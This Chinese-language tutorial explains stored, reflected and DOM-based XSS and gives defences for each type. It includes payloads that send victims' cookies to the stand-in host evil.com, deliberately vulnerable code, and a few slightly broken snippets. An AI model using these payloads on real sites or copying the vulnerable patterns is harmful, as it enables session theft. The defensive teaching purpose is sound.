# 前言

> 參考文章：
>
> - [XSS三種攻擊類型](https://hackmd.io/@hiiii/ryZQl-cFp)
> - [XSS 攻擊和防堵](https://yuchitung.github.io/2019/07/03/what-is-cross-site-scripting-and-how-to-prevent-it/)

**XSS(Cross Site Scripting)** 是一種從網頁的漏洞下手，插入惡意程式碼的攻擊方式。攻擊本身是不給 server 帶來傷害，會造成傷害的是其他使用者。手法是在網站上一些可以讓使用者輸入的地方埋入 html 或是 JavaScript 的惡意腳本，讓其他使用者在瀏覽這個網頁時可以在背後竊取使用者的 cookie 送到指定伺服器或是引導到虛假頁面。

大致分成以下三種類型：

| **惡意程式碼** | **存放的位置** | **插入點** |
| --- | --- | --- |
| 儲存型 XSS | 後端資料庫 | HTML |
| 反射型 XSS | URL | HTML |
| DOM 型 XSS | 後端資料庫/前端儲存/URL | 前端 JavaScript |

---

# Stored XSS (儲存型)

> ✏️ **經由使用者輸入，然後被存在 server 資料庫中的 JavaScript，若其後用來作為網頁顯示的時候，沒有過濾或是 encode 處理會被視為正常的 JavaScript 執行，藉此達到攻擊別的使用者的效果。常見的場景如論壇文章、留言板等公開的頁面。**


- **觸發方式**：當攻擊者將惡意腳本儲存於網站上時觸發，例如在評論或留言板中。
- **腳本位置**：**腳本被永久儲存於伺服器上**，每當該頁面被瀏覽時都會執行。
- **受害範圍**：攻擊可以持續很長時間，影響所有瀏覽該頁面的使用者。

### 🔥 什麼是 Stored XSS（儲存型 XSS）？

Stored XSS 是一種將**惡意 JavaScript 程式碼儲存在網站伺服器上**的攻擊手法。這段惡意程式碼最常透過留言、文章、用戶名稱等使用者輸入欄位注入，**一旦其他使用者造訪含有該程式碼的網頁，就會在他們的瀏覽器中被執行**。

### 🧨 攻擊流程：

1. **攻擊者輸入惡意代碼**（例如在留言板中輸入 `<script>alert('中招了')</script>`）。
2. 這段內容被 **儲存到伺服器資料庫** 中（例如留言表中的一筆記錄）。
3. 當一般使用者瀏覽該頁面時，**留言的內容會從資料庫取出，插入網頁的 HTML 中**。
4. 瀏覽器遇到 `<script>` 標籤，就會執行其中的 JavaScript，導致中毒或資訊洩漏。

### 🧷 常見的攻擊目的：

- 竊取其他使用者的 Cookie 或登入憑證（Session）
- 強制用戶轉址到惡意網站
- 植入鍵盤側錄器（Keylogger）
- 冒充使用者進行操作（如發文、留言）

### 🧪 更真實的例子：

假設一個留言板的儲存流程是這樣的（用 JavaScript 模擬）：

```js
// 假設使用者送出的留言
let userComment = req.body.comment;
// 儲存到資料庫（沒做任何濾除）
saveToDB(userComment);
```

然後在網頁中這樣顯示留言內容：

```html
<ul>
  <!-- 直接插入使用者的留言 -->
  <li>${userComment}</li>
</ul>
```

如果使用者輸入：

```html
<script>document.location='<http://evil.com/steal?cookie=>' + document.cookie</script>
```

那麼當其他人看到這筆留言時，他們的瀏覽器就會被導向到 `evil.com`，並把他們的 cookie 傳給攻擊者。

### 🛡 如何防禦 Stored XSS？

1. **對使用者輸入進行過濾與驗證（Validation & Sanitization）**
    - 禁止輸入 `<script>`, `onload=`, `onclick=`, 等會執行程式碼的標籤或屬性
    - 可使用像 [DOMPurify](https://github.com/cure53/DOMPurify) 的函式庫來淨化 HTML
   
2. **使用 HTML Escape（轉義）**
    - 在顯示輸入內容時將 `<`, `>`, `"` 這些字元轉為 `&lt;`, `&gt;`, `&quot;`
    - 範例：

        ```js
        function escapeHTML(str) {
          return str.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        ```

3. **使用 Content Security Policy (CSP)**
    - 限制瀏覽器只能執行特定來源的 JS
    - 阻止 inline `<script>` 被執行
   
4. **輸出時根據上下文處理**
    - HTML 內容用 `escapeHTML`
    - 屬性值（如 `<img src="...">`）要避免未處理的使用者輸入
    - JavaScript、CSS、URL 也需對應的處理方式

---

# 反射型 XSS（Reflective XSS）

- **觸發方式**：當使用者點擊包含惡意腳本的特製連結時觸發。
- **腳本位置**：腳本在使用者的請求發送到伺服器後，隨即由 **伺服器返回並在使用者的瀏覽器中執行**。
- **受害範圍**：攻擊是一次性的，只有當用戶實際點擊連結時才會發生。

### 🧨 什麼是反射型 XSS？

反射型 XSS 的關鍵在於：

> 攻擊者將惡意腳本注入 URL 或表單提交的參數中，並且伺服器在未進行適當過濾的情況下，直接將這些輸入「反射」回使用者的頁面中。
>

當使用者點擊這樣的連結時，惡意腳本就在瀏覽器中執行。

### 🎯 攻擊流程：

1. 攻擊者製造一個 **帶有惡意腳本的 URL**（如 `http://example.com?search=<script>...</script>`）。
2. 把這個 URL 發給受害者（可能透過 email、社群、論壇、釣魚網站）。
3. 當受害者點開這個連結時，瀏覽器發出請求。
4. 伺服器 **將攻擊者輸入的內容直接插入回應頁面中**（例如搜尋關鍵字），而沒有做適當轉義。
5. 瀏覽器接收到含有 `<script>` 的 HTML，並執行其中的 JavaScript。
6. 攻擊者可藉此**竊取 Cookie、Session、登入資訊**等機密資料，或執行其他惡意行為（轉址、偽造操作）。

### 🧪 更真實的範例說明：

##### 假設伺服器邏輯如下：

```js
const keyword = req.query.search;
res.send(`<p>搜尋結果：${keyword}</p>`);
```

這個範例中伺服器將使用者輸入的 `search` 值，直接插入 HTML 裡。

##### 攻擊者的連結：

```bash
<http://example.com/search?search=><script>location.href='<http://evil.com?c='+document.cookie></script>
```

##### 使用者點開後，伺服器回應：

```html
<p>搜尋結果：<script>location.href='<http://evil.com?c='+document.cookie></script></p>
```

這段 `<script>` 會直接在瀏覽器中執行，把使用者的 cookie 傳到攻擊者的網站，達到竊取 session 的目的。

### 📌 特點小結：

| 特徵 | 說明 |
| --- | --- |
| 是否寫入資料庫 | ❌ 否（只存在 URL 或 POST/GET 參數） |
| 是否持久 | ❌ 一次性攻擊，需使用者主動點擊特製連結 |
| 攻擊範圍 | 一般限於點擊連結的使用者 |
| 發生位置 | **伺服器會回傳含有惡意腳本的 HTML** |
| 攻擊媒介 | 通常是釣魚信、聊天室、留言或社群平台發送的惡意連結 |

### 🛡 如何防禦 Reflected XSS？

1. **HTML Escape 所有用戶輸入內容**
    - 如：`<script>` 應變成 `&lt;script&gt;`
    - 絕不能直接將輸入插入 HTML 中
2. **使用模板引擎自動處理轉義**
    - 如 Thymeleaf、Handlebars、Vue 等框架預設都會對資料轉義
3. **避免將輸入內容插入「HTML 中的非資料區域」**
    - 特別是 `<script>`、`<style>`、HTML 屬性中（如 `<a href="...">`）
4. **搭配 CSP（Content Security Policy）**
    - 禁止 inline script，例如：

        ```
        Content-Security-Policy: script-src 'self'
        ```

5. **URL 參數處理需特別小心**
    - 使用 `encodeURIComponent()` 處理參數

        ```jsx
        const safeParam = encodeURIComponent(userInput);
        ```

### ✅ 最佳實作範例（安全版本）：

```html
<p>有關 <span id="search"></span> 的搜尋結果：</p>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const keyword = urlParams.get('search');

  // 防止 XSS：將內容插入 textContent 而不是 innerHTML
  document.getElementById("search").textContent = keyword;
</script>
```

---

# 基於 DOM 的 XSS（DOM-based XSS）

- **觸發方式**：當網頁的 JavaScript 錯誤地處理了用戶的輸入，並將其添加到 DOM 中時觸發。
- **腳本執行**：這種攻擊完全在客戶端發生，**惡意腳本由瀏覽器執行，而不是由伺服器返回**。
- **攻擊時機**：攻擊依賴於用戶與網頁的互動。

### 🧠 什麼是 DOM-based XSS？

> DOM-based XSS 是一種攻擊手法，其中 JavaScript 前端程式碼在處理使用者輸入時沒有正確過濾，並將輸入直接操作 DOM（例如 innerHTML），導致瀏覽器執行了攻擊者注入的 JavaScript。
>

這種攻擊**完全發生在用戶端（Client-side）**，伺服器根本不會參與其中。

### 🧨 攻擊流程：

1. 攻擊者製造一個特別設計的 URL，將惡意腳本藏在查詢參數或 URL hash 中。
2. 用戶點擊該 URL。
3. 頁面中的 JavaScript 取得這些參數（如 `location.search` 或 `location.hash`），**未經處理地將其插入 HTML 結構中**（如 `innerHTML`）。
4. 瀏覽器遇到 `<script>` 或可執行的屬性如 `onerror`，就會執行 JavaScript。
5. 攻擊者可藉此竊取資料、操作頁面或傳送資料給惡意伺服器。

### 🧪 你給的範例解析：

```html
<input type="text" id="your_name" />
<button onclick="send()">send</button>
<span id="name"></span>

<script>
  var send = function() {
    var name = document.getElementById('your_name').value;
    document.getElementById('name').innerHTML = name;
  }
</script>
```

這段程式碼中，使用者輸入會被插入 `<span>` 中，若輸入為：

```html
<img src=# onerror="alert('XSS')">
```

那麼 `<span>` 變成了：

```html
<span id="name"><img src=# onerror="alert('XSS')"></span>
```

這樣一來，`<img>` 因為找不到圖片，觸發 `onerror`，瀏覽器就執行了 JavaScript，攻擊成功。

### 🧷 為什麼說「使用者不可能自己輸入這種內容」？

你觀察得很正確：**一般使用者不會自己輸入 `<img onerror>` 這類惡意程式碼**。但攻擊者可以透過：

- **反射型 URL 攻擊**：例如攻擊者傳送這樣的連結：

    ```
    <http://example.com/page.html#><img src=# onerror="alert('XSS')">
    ```

  如果網頁中有如下程式碼：

    ```js
    document.getElementById("target").innerHTML = location.hash.substring(1);s
    ```

  那麼就會變成 DOM-based XSS。

- **搭配儲存型**：留言區或個人資料欄位被儲存了 `<img onerror>` 內容，前端程式將資料取出並 `innerHTML` 插入頁面，也會觸發攻擊。

### ⚠️ DOM-based XSS 最常見的危險來源：

| 危險來源 | 原因 |
| --- | --- |
| `innerHTML` | 將字串直接解析為 HTML，可執行 `<script>` |
| `document.write()` | 直接插入可執行內容 |
| `eval()`、`setTimeout()`、`setInterval()`（含字串） | 可執行任意字串 |
| `location.hash`、`location.search` | 攻擊者可輕易操控 |
| `element.setAttribute(...)` | 若設為 `onerror`、`onclick` 等屬性會導致執行 |

### 🛡 如何防禦 DOM-based XSS？

1. **永遠不要用 `innerHTML` 處理來自使用者的輸入**
    - 替代用法：`textContent` 或 `innerText`

    ```js
    document.getElementById('name').textContent = name;
    ```

2. **使用安全的 DOM API 來操作節點**
    - 用 `createElement()`、`appendChild()` 替代字串拼接
    - 例如：

        ```jsx
        const img = document.createElement('img');
        img.src = '#';
        img.onerror = function() { alert('XSS'); };
        container.appendChild(img);
        ```

3. **對來自 URL 的資料進行嚴格驗證與轉義**
    - 避免直接使用 `location.hash`、`location.search` 的值
    - 可用 `encodeURIComponent` 處理輸入
   
4. **CSP（Content Security Policy）**
    - 限制不能執行 inline JS，例如：

        ```
        Content-Security-Policy: default-src 'self'; script-src 'self';
        ```

### ✅ 安全版本的範例：

```html
<script>
  function send() {
    const name = document.getElementById('your_name').value;
    document.getElementById('name').textContent = name; // 安全，不執行 HTML
  }
</script>
```

---